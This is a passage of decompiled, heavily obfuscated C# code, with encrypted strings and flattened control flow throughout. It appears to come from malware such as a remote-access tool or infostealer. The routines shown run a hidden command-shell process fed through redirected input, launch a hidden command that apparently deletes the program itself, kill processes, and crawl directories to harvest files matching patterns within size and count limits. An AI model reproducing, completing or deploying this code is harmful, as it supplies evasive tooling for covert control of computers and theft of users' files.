			return index68.Substring (options65, num - options65);
		}

		private static string stream76 (string id99, int cache97)
		{
			char c = id99 [cache97];
			int num3 = default(int);
			char c2 = default(char);
			char c3 = default(char);
			int num5 = default(int);
			while (true) {
				int num = 215468455;
				while (true) {
					uint num2 = (uint)(~num ^ -486047298);
					int num4;
					switch (num2 % 23) {
					case 12u:
						break;
					default:
						num = 215468455;
						continue;
					case 14u:
						num = ((num3 >= id99.Length) ? 1081816463 : (~-1410630778));
						continue;
					case 19u:
						return string.Empty;
					case 6u:
						return string.Empty;
					case 15u:
						num = (int)(0 - num2 + 1773549365);
						continue;
					case 20u:
						num3 = line63 (id99, num3 + flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("2d9e65c4dfd07ac015c"));
						num = (int)(num2 ^ 0x42029008);
						continue;
					case 8u:
						num = ((num3 != flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("735bfd6ed1fd245f89f")) ? ((int)(num2 ^ 0x1D935A50)) : ((int)(0 - num2) + -2036948067));
						continue;
					case 10u:
						num = ((c2 != c3) ? (~-10727645) : (~-1223833510));
						continue;
					case 0u:
						num = ((num5 == 0) ? 1460577345 : 1562193285);
						continue;
					case 18u:
						num = (int)(num2 ^ 0x51463002);
						continue;
					case 9u:
						num = ((c2 != flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("76b0679edc4ebceaf9d")) ? ((int)num2 + -1077409188) : ((int)(num2 ^ 0x741462C1)));
						continue;
					case 13u:
						num5 = flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("582a043c9c6d3dc699c");
						num3 = cache97 + flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("5a9b7cdd7c2bad8009e");
						num = (int)(0 - num2) ^ -136585621;
						continue;
					case 5u:
						num5 += flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("2f93c259784e2428bb8");
						num = (int)num2 - -1083255911;
						continue;
					case 1u:
						if (c != flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("485bbf3ec3e2f347f9c")) {
							num = (int)num2 - -89065421;
							continue;
						}
						num4 = flag6144.df1511e183d74449890cb9f7b5b3b527 ("9fce4441926aa11");
						goto IL_0294;
					case 22u:
						num5 -= flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("f98031518dfd57f19e7");
						num = (int)(0 - num2 + 1420688064);
						continue;
					case 4u:
						num3 += flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("8c1ab075e59c574adc0");
						num = --2016968198;
						continue;
					case 21u:
						num = ((num5 > 0) ? ((int)num2 - -634972338) : ((int)(num2 - 141673641)));
						continue;
					case 7u:
						num = (int)(~num2) + -2119149360;
						continue;
					case 11u:
						c2 = id99 [num3];
						num = 1778529926;
						continue;
					case 3u:
						num = ((c2 != c) ? 1538418698 : (--698463728));
						continue;
					case 2u:
						num3 += flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("3f9f30f58ae8ca31fdc");
						num = 897986629;
						continue;
					case 16u:
						num4 = flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("6c04425c374ed7e1f9c");
						goto IL_0294;
					case 17u:
						{
							return id99.Substring (cache97, num3 - cache97);
						}
						IL_0294:
						c3 = (char)num4;
						num = ~-22281053;
						continue;
					}
					break;
				}
			}
		}

		private static string array57 (string input6625, int graph885)
		{
			int num = graph885;
			while (true) {
				int num2 = ~1494070112;
				while (true) {
					uint num3 = (uint)(num2 + -2139420825);
					switch (num3 % 9) {
					case 4u:
						break;
					default:
						num2 = -1494070113;
						continue;
					case 1u:
						num2 = (int)(num3 - 1673596092);
						continue;
					case 2u:
						num2 = ((num >= input6625.Length) ? (-1991242138) : (-106548101));
						continue;
					case 7u:
						num2 = (int)((input6625 [num] == flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("2e934753bd59b36ed71")) ? (~num3 ^ 0x15A98529) : (~num3 ^ 0x54CE4553));
						continue;
					case 5u:
						num2 = ((input6625 [num] != flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("ad1ba15f1e9264755ed")) ? ((int)(~num3 ^ 0x185F4603)) : ((int)num3 - -254726788));
						continue;
					case 8u:
						num2 = ((input6625 [num] == flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("adffd55d539c83871e4")) ? ((int)(0 - num3) + -1488152597) : ((int)(num3 - 997268540)));
						continue;
					case 6u:
						num2 = ((input6625 [num] <= flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("4e4c5c5a1a9cda3e99c")) ? ((int)num3 ^ -1042097179) : ((int)num3 ^ -995997602));
						continue;
					case 3u:
						num += flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("6af343253fcc3e6799f");
						num2 = ~1012119733;
						continue;
					case 0u:
						return input6625.Substring (graph885, num - graph885);
					}
					break;
				}
			}
		}
	}
}
namespace settings223
{
	public static class position151
	{
		public static string child530 (string height935, params string[] queue208)
		{
			string text873 = height935;
			int num = 0;
			string text874 = default(string);
			while (true) {
				int num2 = ~1921202930;
				while (true) {
					uint num3 = (uint)(num2 - 1597341318);
					switch (num3 % 7) {
					case 3u:
						break;
					default:
						num2 = -1921202931;
						continue;
					case 6u:
						num += flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("625315bc13e8c24369d");
						num2 = ~-1659435272;
						continue;
					case 5u:
						num2 = ((num >= queue208.Length) ? (-1972811195) : (-1546764843));
						continue;
					case 4u:
						text874 = queue208 [num];
						num2 = (string.IsNullOrEmpty (text874) ? (--1843232921) : 1799048518);
						continue;
					case 1u:
						num2 = (int)(0 - num3) + -1859108978;
						continue;
					case 2u:
						text873 = Path.Combine (text873, text874);
						num2 = (int)num3 - -1641525721;
						continue;
					case 0u:
						return text873;
					}
					break;
				}
			}
		}
	}
}
namespace error3589
{
	public static class previous619
	{
		public static ProcessModule start922 (this Process queue45)
		{
			try {
				return queue45.MainModule;
			} catch {
				return null;
			}
		}

		public static void tree52 (this array8360.message891 time295)
		{
			try {
				previous46 (time295.next15);
			} catch {
			}
		}

		public static void status751 (this Process position2611)
		{
			try {
				previous46 (position2611.Handle);
			} catch {
				try {
					position2611?.Kill ();
				} catch {
				}
			}
		}

		private static void previous46 (IntPtr parent21)
		{
			if (parent21 != IntPtr.Zero) {
				stack564.buffer78 (parent21);
			}
		}

		public static void options597 ()
		{
			string text873 = data780.settings9094 ();
			string text874 = flag6144.0e291526dfde44109a60e580c474e7dd ("7f7734afade9f7b3616f73dd41888d14e266febca72ec43da9f") + text873 + flag6144.0e291526dfde44109a60e580c474e7dd ("6072e59d41a9e");
			ProcessStartInfo startInfo = new ProcessStartInfo {
				FileName = flag6144.0e291526dfde44109a60e580c474e7dd ("f981de6688fcdf05feb79ae82"),
				Arguments = flag6144.0e291526dfde44109a60e580c474e7dd ("55eea00e96233779d") + text874,
				CreateNoWindow = flag6144.09343d4890d2414f8aa92dc5c3eb3877 ("ac33e999421df"),
				UseShellExecute = flag6144.09343d4890d2414f8aa92dc5c3eb3877 ("8fb268f97c231"),
				WindowStyle = (ProcessWindowStyle)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("bcb41e51c6950e1bfb8")
			};
			rate91.buffer7274 ();
			Process.Start (startInfo);
		}
	}
}
namespace state079
{
	public class rate33
	{
		private static readonly Random cell457 = new Random ();

		public static string format0123 ()
		{
			string text873 = string.Format (flag6144.0e291526dfde44109a60e580c474e7dd ("e9e60313c73fad070c418"), Guid.NewGuid ());
			while (true) {
				int num = -1879717805;
				while (true) {
					uint num2 = (uint)(num ^ -2132514047);
					switch (num2 % 4) {
					case 0u:
						break;
					default:
						num = -1879717805;
						continue;
					case 2u:
						num = (int)((!char.IsLetter (text873 [0])) ? (~num2 ^ 0x522FFC43) : ((0 - num2) ^ 0x156C632));
						continue;
					case 1u:
						return text873;
					case 3u: {
						char[] array8361 = text873.ToCharArray ();
						array8361 [0] = (char)(flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("2f9563e5d9e5b6c27b0") + cell457.Next (flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("2d9038aa32bae0a9285")));
						return new string (array8361);
					}
					}
					break;
				}
			}
		}

		public static byte[] name9659 (int file107, int level8676)
		{
			return input730 (cell457.Next (file107, level8676 + flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("0d937499ce8a207554d")));
		}

		public static byte[] input730 (int width9052)
		{
			byte[] array8361 = new byte[width9052];
			cell457.NextBytes (array8361);
			return array8361;
		}

		public static int tree9541 (int limit796, int data1244)
		{
			return cell457.Next (limit796, data1244);
		}
	}
}
namespace offset05
{
	public static class time0098
	{
		private static readonly Dictionary<string, Regex> rate057 = new Dictionary<string, Regex> ();

		public static List<Regex> amount71 (List<string> settings78)
		{
			List<Regex> list839 = new List<Regex> ();
			if (settings78 != null) {
				while (true) {
					int num = 1944530958;
					while (true) {
						uint num2;
						switch ((num2 = (uint)(num - 919622309)) % 4) {
						case 2u:
							break;
						default:
							num = 1944530958;
							continue;
						case 1u:
							goto IL_0036;
						case 0u:
							goto end_IL_0009;
						case 3u: {
							using List<string>.Enumerator enumerator = settings78.GetEnumerator ();
							while (enumerator.MoveNext ()) {
								while (true) {
									string current615 = enumerator.Current;
									int num3 = -2089457164;
									while (true) {
										switch ((num2 = (uint)(num3 - 1217088077)) % 4) {
										case 0u:
											num3 = 1683660731;
											continue;
										default:
											num3 = 1683660731;
											continue;
										case 2u:
											break;
										case 3u:
											goto IL_00a7;
										case 1u:
											goto IL_00be;
										}
										break;
										IL_00be:
										try {
											if (!rate057.TryGetValue (current615, out var value)) {
												goto IL_00d0;
											}
											goto IL_0170;
											IL_00d0:
											int num4 = --1861331127;
											goto IL_00d6;
											IL_00d6:
											while (true) {
												switch ((num2 = (uint)(num4 + -46971436)) % 5) {
												case 0u:
													break;
												default:
													num4 = 1861331127;
													continue;
												case 1u:
													value = new Regex (flag6144.0e291526dfde44109a60e580c474e7dd ("f9ef60ac94ee4") + Regex.Escape (current615).Replace (flag6144.0e291526dfde44109a60e580c474e7dd ("d9b9650bc75af19"), flag6144.0e291526dfde44109a60e580c474e7dd ("63a7b9ab250429e")).Replace (flag6144.0e291526dfde44109a60e580c474e7dd ("2e9db0c13a05de2"), flag6144.0e291526dfde44109a60e580c474e7dd ("4879edd645f9c")) + flag6144.0e291526dfde44109a60e580c474e7dd ("ae576d998ba4b"), (RegexOptions)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("7b2a66a2501ee3bd09c"));
													num4 = (int)num2 + -1175332387;
													continue;
												case 2u:
													goto IL_0170;
												case 3u:
													rate057 [current615] = value;
													num4 = (int)(num2 ^ 0x30231FD1);
													continue;
												case 4u:
													goto end_IL_00be;
												}
												break;
											}
											goto IL_00d0;
											IL_0170:
											list839.Add (value);
											num4 = 1308688515;
											goto IL_00d6;
											end_IL_00be:;
										} catch {
										}
										goto end_IL_0097;
										IL_00a7:
										if (string.IsNullOrEmpty (current615)) {
											goto end_IL_0097;
										}
										num3 = (int)(~num2) + -1367595714;
									}
									continue;
									end_IL_0097:
									break;
								}
							}
							return list839;
						}
						}
						break;
						IL_0036:
						num = ((settings78.Count == 0) ? ((int)(num2 + 1515522288)) : ((int)(~num2) + -1109154366));
					}
					continue;
					end_IL_0009:
					break;
				}
			}
			return list839;
		}
	}
}
namespace rate3407
{
	public static class settings54
	{
		public static string cache19 (string price083)
		{
			return new string (price083.Where ((char value) => !Path.GetInvalidPathChars ().Contains (value)).ToArray ());
		}

		public static bool time0110 (this string queue53, string width947)
		{
			return string.Equals (queue53, width947, (StringComparison)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("1e96781c020aa86b7ba"));
		}

		public static bool tree13 (this string total3982, string item0915)
		{
			return total3982.IndexOf (item0915, (StringComparison)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("64bb000e370656a1f9f")) >= 0;
		}

		public static bool sum897 (this string session727, string mode88)
		{
			return session727.StartsWith (mode88, (StringComparison)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("6add54f7a6c1876629c"));
		}

		public static bool map23 (this string stack99, string text985)
		{
			return stack99.EndsWith (text985, (StringComparison)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("0c9b72b108abdac1872"));
		}
	}
}
namespace start7427
{
	public static class start8302
	{
		private static readonly DateTime result278 = new DateTime (flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("50336a8f7b027daf59c"), flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("8fdf75b981927969575"), flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("ad06ac501099d2c0c37"), 0, 0, 0, (DateTimeKind)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("757cde3973d27279d9c"));

		public static long source0847 (this DateTime left9110)
		{
			return (long)(left9110.ToUniversalTime () - result278).TotalSeconds;
		}
	}
}
namespace date298
{
	public class cell77
	{
		private Process column500;

		public void index87 (string number5373)
		{
			if (column500 == null) {
				return;
			}
			while (true) {
				int num = ~817017099;
				while (true) {
					uint num2 = (uint)(num + 1724362454);
					switch (num2 % 4) {
					case 0u:
						break;
					default:
						num = -817017100;
						continue;
					case 2u:
						num = ((!column500.HasExited) ? ((int)(~num2 ^ 0x3E603A60)) : ((int)num2 ^ -2049320875));
						continue;
					case 1u:
						return;
					case 3u:
						try {
							column500.StandardInput.WriteLine (number5373);
							column500.StandardInput.Flush ();
							return;
						} catch {
							return;
						}
					}
					break;
				}
			}
		}

		public void node6133 ()
		{
			column500 = new Process {
				StartInfo = new ProcessStartInfo {
					FileName = flag6144.0e291526dfde44109a60e580c474e7dd ("8e45bfa1494e7c967"),
					RedirectStandardInput = flag6144.09343d4890d2414f8aa92dc5c3eb3877 ("d9732c3e05df9"),
					RedirectStandardOutput = flag6144.09343d4890d2414f8aa92dc5c3eb3877 ("5641283e8de9e"),
					RedirectStandardError = flag6144.09343d4890d2414f8aa92dc5c3eb3877 ("ae1bc139154a0"),
					UseShellExecute = false,
					CreateNoWindow = flag6144.09343d4890d2414f8aa92dc5c3eb3877 ("2d9f092253d7a"),
					WindowStyle = (ProcessWindowStyle)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("4594b038abfe4a55e9f"),
					WorkingDirectory = position291.max79
				}
			};
			while (true) {
				int num = -637099888;
				while (true) {
					uint num2 = (uint)(num + -1613105651);
					switch (num2 % 7) {
					case 0u:
						break;
					default:
						num = -637099888;
						continue;
					case 3u:
						column500.OutputDataReceived += delegate {
						};
						num = -1903152290;
						continue;
					case 4u:
						column500.ErrorDataReceived += delegate {
						};
						num = 1643082547;
						continue;
					case 5u:
						column500.Start ();
						num = (int)num2 ^ -1670294866;
						continue;
					case 1u:
						column500.BeginErrorReadLine ();
						num = (int)num2 + -1401400129;
						continue;
					case 2u:
						column500.BeginOutputReadLine ();
						num = (int)(num2 ^ 0x4D1DFA2B);
						continue;
					case 6u:
						return;
					}
					break;
				}
			}
		}

		public void right29 ()
		{
			if (column500 != null) {
				goto IL_0008;
			}
			goto IL_005a;
			IL_0008:
			int num = -734136085;
			goto IL_000e;
			IL_000e:
			while (true) {
				uint num2 = (uint)(num + 1173241628);
				switch (num2 % 5) {
				case 0u:
					break;
				default:
					num = -734136085;
					continue;
				case 3u:
					goto IL_0039;
				case 1u:
					goto IL_005a;
				case 2u:
					column500.Kill ();
					num = (int)num2 ^ -845469848;
					continue;
				case 4u:
					return;
				}
				break;
				IL_0039:
				num = (column500.HasExited ? ((int)num2 ^ -441222785) : ((int)(num2 - 773198099)));
			}
			goto IL_0008;
			IL_005a:
			column500.Close ();
			num = ~-186969947;
			goto IL_000e;
		}
	}
}
namespace buffer552
{
	public class data974
	{
		public static List<string> tree856 (avg4687 map100)
		{
			List<string> list839 = new List<string> ();
			if (map100 == null) {
				goto IL_000c;
			}
			object obj = map100.key225;
			goto IL_00ad;
			IL_00a4:
			obj = null;
			goto IL_00ad;
			IL_000c:
			int num = 845800617;
			goto IL_0011;
			IL_0011:
			Stopwatch stopwatch = default(Stopwatch);
			long speed = default(long);
			item4706 current615 = default(item4706);
			int num4 = default(int);
			while (true) {
				int num5;
				uint num2;
				switch ((num2 = (uint)(num - -878314858)) % 9) {
				case 5u:
					break;
				default:
					num = 845800617;
					continue;
				case 7u:
					if (map100.graph53 <= 0) {
						num = (int)(0 - num2 + 543361992);
						continue;
					}
					num5 = map100.graph53 * flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("e96898cd15e2f15eb55");
					goto IL_00ce;
				case 8u:
					stopwatch = Stopwatch.StartNew ();
					num = ~459664091;
					continue;
				case 0u:
					goto IL_0070;
				case 4u:
					goto IL_0097;
				case 1u:
					goto IL_00a4;
				case 6u:
					num5 = 0;
					goto IL_00ce;
				case 2u:
					speed = 0L;
					num = (int)num2 + -1901273514;
					continue;
				case 3u:
					{
						using (List<item4706>.Enumerator enumerator = map100.key225.GetEnumerator ()) {
							while (true) {
								IL_01ae:
								int num3 = (enumerator.MoveNext () ? (~-1354417210) : (~-562064560));
								while (true) {
									switch ((num2 = (uint)(num3 + -529235667)) % 8) {
									case 5u:
										num3 = 1354417209;
										continue;
									default:
										num3 = 1354417209;
										continue;
									case 7u: {
										List<string> collection = cache336 (current615, map100.format70, num4, stopwatch, ref speed);
										list839.AddRange (collection);
										num3 = 1110682637;
										continue;
									}
									case 0u:
										num3 = ((stopwatch.ElapsedMilliseconds < num4) ? ((int)(0 - num2) ^ -2043678022) : ((int)(0 - num2) ^ -1544486738));
										continue;
									case 1u:
										num3 = (int)((num4 <= 0) ? (num2 + 282932665) : (num2 - 367481006));
										continue;
									case 6u:
										current615 = enumerator.Current;
										num3 = --1858253460;
										continue;
									case 2u:
										break;
									case 3u:
										goto end_IL_0101;
									case 4u:
										goto end_IL_0101;
									}
									goto IL_01ae;
									continue;
									end_IL_0101:
									break;
								}
								break;
							}
						}
						stopwatch.Stop ();
						return list839;
					}
					IL_00ce:
					num4 = num5;
					num = --565467484;
					continue;
				}
				break;
				IL_0070:
				num = (int)((map100.key225.Count == 0) ? ((0 - num2) ^ 0x3455B235) : (num2 ^ 0x71F8D470));
			}
			goto IL_000c;
			IL_0097:
			return list839;
			IL_00ad:
			if (obj != null) {
				num = --918443;
				goto IL_0011;
			}
			goto IL_0097;
		}

		private static List<string> cache336 (item4706 node17, long range83, int name0753, Stopwatch limit828, ref long speed6761)
		{
			List<string> list839 = new List<string> ();
			if (node17 != null) {
				List<Regex> number122 = default(List<Regex>);
				List<string> list840 = default(List<string>);
				string fullName = default(string);
				string fullName2 = default(string);
				string text874 = default(string);
				while (true) {
					int num = 985757527;
					while (true) {
						uint num2 = (uint)(num - 218927958);
						switch (num2 % 12) {
						case 2u:
							break;
						default:
							num = 985757527;
							continue;
						case 6u:
							goto end_IL_0009;
						case 8u:
							goto IL_0061;
						case 0u:
							goto IL_007f;
						case 10u:
							return list839;
						case 11u:
							number122 = time0098.amount71 (node17.data074 ?? new List<string> ());
							num = 1749246178;
							continue;
						case 5u:
							return list839;
						case 9u:
							goto IL_00e1;
						case 7u:
							goto IL_016d;
						case 3u:
							goto IL_0185;
						case 1u:
							goto IL_01ad;
						case 4u: {
							List<Regex> key = time0098.amount71 (node17.settings54 ?? new List<string> ());
							using (List<string>.Enumerator enumerator = list840.GetEnumerator ()) {
								while (enumerator.MoveNext ()) {
									while (true) {
										string current615 = enumerator.Current;
										int num3 = ((name0753 <= 0) ? (~1969744546) : (-1318620941));
										while (true) {
											num2 = (uint)(num3 - 1364589124);
											switch (num2 % 9) {
											case 8u:
												num3 = -2095673306;
												continue;
											default:
												num3 = -2095673306;
												continue;
											case 6u:
												break;
											case 2u:
												goto IL_0258;
											case 1u:
												goto end_IL_01f5;
											case 0u:
												if (speed6761 < range83) {
													num3 = (int)(num2 + 1692445275);
													continue;
												}
												goto end_IL_0272;
											case 7u:
												if (limit828.ElapsedMilliseconds < name0753) {
													num3 = (int)(num2 + 713465518);
													continue;
												}
												goto end_IL_0272;
											case 4u:
												goto IL_02c3;
											case 3u:
												goto end_IL_0272;
											case 5u:
												goto IL_02ef;
											}
											num3 = ((list839.Count < node17.right20) ? ((int)num2 ^ -195080173) : ((int)(~num2) + -530237228));
											continue;
											IL_02c3:
											num3 = ((range83 > 0) ? (-1482633105) : (~1154776953));
											continue;
											IL_0258:
											num3 = ((node17.right20 <= 0) ? (-1570243465) : (~1483823447));
											continue;
											end_IL_01f5:
											break;
										}
										continue;
										IL_02ef:
										try {
											DirectoryInfo directoryInfo = new DirectoryInfo (current615);
											if (directoryInfo.Exists) {
												foreach (FileInfo item in (IEnumerable<FileInfo>)new status423 (directoryInfo, node17.message089).temp9672 ()) {
													try {
														if (name0753 > 0) {
															goto IL_0334;
														}
														goto IL_0517;
														IL_0334:
														int num4 = -797043720;
														goto IL_0339;
														IL_0339:
														while (true) {
															num2 = (uint)(num4 ^ -642037638);
															switch (num2 % 21) {
															case 18u:
																break;
															default:
																num4 = -797043720;
																continue;
															case 1u:
																goto IL_03a7;
															case 19u:
																goto IL_03cb;
															case 17u:
																goto IL_03ea;
															case 3u:
																goto IL_0403;
															case 13u:
																goto IL_045c;
															case 20u:
																goto IL_048f;
															case 9u:
																goto end_IL_032d;
															case 11u:
																goto IL_04bc;
															case 2u:
																fullName = item.FullName;
																num4 = ~289129426;
																continue;
															case 7u:
																goto IL_04f9;
															case 4u:
																goto IL_0517;
															case 14u:
																goto end_IL_032d;
															case 5u:
																goto end_IL_061b;
															case 0u:
																goto IL_0551;
															case 15u:
																goto IL_0579;
															case 12u:
																goto IL_05a1;
															case 6u:
																list839.Add (item.FullName);
																speed6761 += item.Length;
																num4 = -2034618875;
																continue;
															case 8u:
																goto end_IL_032d;
															case 10u:
																goto end_IL_032d;
															case 16u:
																goto end_IL_032d;
															}
															break;
															IL_05a1:
															num4 = (int)(fullName.StartsWith (fullName2, (StringComparison)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("c96c1d10acfb3195cf1")) ? (~num2 ^ 0x7098CA80) : (num2 - 1185442345));
															continue;
															IL_045c:
															fullName2 = directoryInfo.FullName;
															num4 = ((fullName.Length >= fullName2.Length) ? ((int)((0 - num2) ^ 0xC32A7E3)) : ((int)num2 + -1629387344));
															continue;
															IL_04bc:
															num4 = ((item.Length <= node17.size600) ? ((int)(num2 - 1896372425)) : ((int)(~num2) + -935554393));
															continue;
															IL_0579:
															num4 = ((list839.Count < node17.right20) ? ((int)((0 - num2) ^ 0x7B1E3F1B)) : ((int)num2 ^ -777846216));
															continue;
															IL_03a7:
															num4 = (int)((limit828.ElapsedMilliseconds < name0753) ? (~num2 ^ 0x3C2B5F09) : (num2 - 1391830127));
															continue;
															IL_03ea:
															num4 = ((range83 <= 0) ? (-1672960345) : (-1429333440));
															continue;
															IL_0551:
															num4 = ((speed6761 + item.Length <= range83) ? ((int)num2 - -684938349) : ((int)((0 - num2) ^ 0x6BCC8E64)));
															continue;
															IL_048f:
															num4 = ((node17.right20 > 0) ? (~1093141166) : (-477268530));
															continue;
															IL_0403:
															string text873 = fullName.Substring (fullName2.Length);
															char[] array8361 = new char[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("be3993be2b92d6c5e38")];
															array8361 [0] = Path.DirectorySeparatorChar;
															array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("8f8a20a33a919a8e040")] = Path.AltDirectorySeparatorChar;
															num4 = ((!page831 (text873.TrimStart (array8361), number122, key)) ? (~1909288053) : (-1199860776));
															continue;
															IL_04f9:
															num4 = ((node17.size600 <= 0) ? (-1842989847) : (-627718712));
															continue;
															IL_03cb:
															num4 = ((speed6761 >= range83) ? ((int)(num2 - 1232012690)) : ((int)num2 ^ -1569436239));
														}
														goto IL_0334;
														IL_0517:
														num4 = ((range83 > 0) ? (-645532449) : (-1572146924));
														goto IL_0339;
														end_IL_032d:;
													} catch {
													}
													continue;
													end_IL_061b:
													break;
												}
											}
										} catch {
										}
										goto IL_063a;
										continue;
										end_IL_0272:
										break;
									}
									break;
									IL_063a:;
								}
							}
							return list839;
						}
						}
						break;
						IL_01ad:
						num = ((range83 > 0) ? ((int)num2 + -503967911) : ((int)(0 - num2) + -2050463522));
						continue;
						IL_016d:
						num = ((name0753 <= 0) ? (--1503880185) : 835770846);
						continue;
						IL_007f:
						num = ((limit828.ElapsedMilliseconds < name0753) ? ((int)num2 - -887037297) : ((int)(0 - num2) + -1951036096));
						continue;
						IL_0185:
						text874 = array7199.level443 (node17.stream037);
						num = ((!string.IsNullOrEmpty (text874)) ? 439514451 : (--845941324));
						continue;
						IL_0061:
						num = ((speed6761 >= range83) ? ((int)(0 - num2) ^ -1685006012) : ((int)(~num2 + 1521607906)));
						continue;
						IL_00e1:
						string text875 = text874;
						char[] array8362 = new char[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("8e79d32b9b9bc0db99f")];
						array8362 [0] = (char)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("d9caaaff28e153ff357");
						list840 = (from map82 in text875.Split (array8362)
							select map82.Trim () into height646
							where !string.IsNullOrEmpty (height646)
							select height646).ToList ();
						num = ((list840.Count != 0) ? 762818537 : (~-2073303264));
					}
					continue;
					end_IL_0009:
					break;
				}
			}
			return list839;
		}

		private static bool page831 (string index70, List<Regex> number06, List<Regex> key83)
		{
			while (true) {
				int num = -1288501937;
				while (true) {
					uint num2 = (uint)(num - 1272764815);
					switch (num2 % 5) {
					case 3u:
						break;
					default:
						num = -1288501937;
						continue;
					case 2u:
						return !key83.Exists ((Regex regex) => regex.IsMatch (index70));
					case 0u:
						num = ((!number06.Exists ((Regex speed140) => speed140.IsMatch (index70))) ? ((int)num2 - -1410170866) : ((int)(0 - num2) ^ -1856900856));
						continue;
					case 4u:
						num = ((number06.Count == 0) ? ((int)(num2 ^ 0x3CA330D8)) : ((int)num2 - -434226111));
						continue;
					case 1u:
						return false;
					}
					break;
				}
			}
		}
	}
}
namespace status413
{
	public class status746
	{
		public static byte[] status87 ()
		{
			return new byte[0];
		}
	}
}
namespace column8870
{
	public class error759
	{
		private Process range5844;

		private static string height9592 (int max95)
		{
			if (!data780.stack3101) {
				goto IL_000a;
			}
			goto IL_00c2;
			IL_000a:
			int num = ~539724024;
			goto IL_0010;
			IL_0010:
			bool flag6145 = default(bool);
			while (true) {
				uint num2 = (uint)(num + 730687169);
				switch (num2 % 9) {
				case 2u:
					break;
				default:
					num = -539724025;
					continue;
				case 3u: {
					string height2 = position291.max79;
					string[] array8362 = new string[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("44a130e7675784f959f")];
					array8362 [0] = flag6144.0e291526dfde44109a60e580c474e7dd ("6c7c6efdf57e039a61170bcc4de9c");
					array8362 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("9c7ad033e49d5641093")] = flag6144.0e291526dfde44109a60e580c474e7dd ("461b0c33c92a94da0728cfb8c5a4f3c08d85044574d9e");
					array8362 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("e9e9a82e75e812b5f24")] = flag6144.0e291526dfde44109a60e580c474e7dd ("adc6ac1e07999c9f3e0");
					array8362 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("62d3e84103ca2067f9d")] = flag6144.0e291526dfde44109a60e580c474e7dd ("8f7e68195b13246a0ae9952bbd26f1ddc2eca8c");
					return position151.child530 (height2, array8362);
				}
				case 5u:
					goto IL_00c2;
				case 1u:
					return flag6144.0e291526dfde44109a60e580c474e7dd ("0e947058b4941c5ffe5cdcf917ca121");
				case 0u:
					return flag6144.0e291526dfde44109a60e580c474e7dd ("3d9a27e6e3297f8e5a8d9f5d6a4a06d");
				case 7u:
					goto IL_0123;
				case 6u: {
					string height = position291.max79;
					string[] array8361 = new string[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("6e4f2196262d458399e")];
					array8361 [0] = flag6144.0e291526dfde44109a60e580c474e7dd ("8c73a828cf4bdb9d6d6c6048e7c");
					array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("0f9b5e21e43f996ef4b")] = flag6144.0e291526dfde44109a60e580c474e7dd ("3f9840114719323b61cf67b619a351d278d6c54b3e045");
					array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("0f9a20a06ab9a5c3951")] = flag6144.0e291526dfde44109a60e580c474e7dd ("c98bdbb53bcc7add8d6");
					array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("8d825803e09ac7fd198")] = flag6144.0e291526dfde44109a60e580c474e7dd ("1e997fe899741b93ef541b33581f0125a3abe4a");
					return position151.child530 (height, array8361);
				}
				case 4u:
					goto IL_01ae;
				case 8u:
					return flag6144.0e291526dfde44109a60e580c474e7dd ("4378ae2ffd850570a6fb2d86807267472e2939e");
				}
				break;
				IL_01ae:
				num = ((!flag6145) ? ((int)(num2 - 1699217448)) : ((int)(~num2) ^ -1472925287));
				continue;
				IL_0123:
				num = (flag6145 ? 619662066 : (-611520686));
			}
			goto IL_000a;
			IL_00c2:
			flag6145 = IntPtr.Size == flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("d9a003b7e1d8c1686e4");
			num = ((max95 == flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("e93a1afa76e3d77bc09")) ? 584079860 : (~-153342573));
			goto IL_0010;
		}

		public void stack182 (string file670)
		{
			if (range5844 == null) {
				return;
			}
			while (true) {
				int num = 1997607537;
				while (true) {
					uint num2;
					switch ((num2 = (uint)(num + -627270378)) % 4) {
					case 0u:
						break;
					default:
						num = 1997607537;
						continue;
					case 3u:
						num = ((!range5844.HasExited) ? ((int)(0 - num2) + -187440898) : ((int)num2 ^ -1023642157));
						continue;
					case 2u:
						return;
